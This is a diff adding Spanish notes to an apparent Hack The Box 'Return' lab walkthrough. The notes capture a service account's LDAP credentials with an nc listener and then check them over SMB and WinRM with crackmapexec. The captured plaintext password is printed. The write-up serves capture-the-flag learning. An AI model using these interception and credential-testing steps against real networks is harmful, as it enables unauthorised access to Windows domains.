@@ -58,9 +58,41 @@
 
 ```
 
+Desde aqui ya te das cuenta que es un AD primer paso conseguir credenciales validas.
+
+![image](https://github.com/gecr07/Return-HTB/assets/63270579/5294ce5e-4b5f-41ca-84e1-f68ed839302a)
+
+Para ver si aluna conexion llega SIEMPRE el nc
+
+```
+nc -lvnp 389
+
+```
+
+Lo que nos da ya un usuario valido y la contraseña.
+
+```
+connect to [10.10.14.146] from (UNKNOWN) [10.129.247.90] 62505
+0*`%return\svc-printer
+                      1edFg43012!!
 
 
+```
 
+Probamos que el usuario y pass sea valido. Y ademas checamos el winrm que vemos que tenemos el puerto abierto
+
+```
+crackmapexec smb 10.129.247.90 -u 'svc-printer' -p '1edFg43012!!'
+
+crackmapexec winrm 10.129.247.90 -u 'svc-printer' -p '1edFg43012!!' 
+
+```
+
+Si nos pone P0wned entonces tenemos posibilidad de entrar por Winrm.
+
+```
+
+```
 
 
 
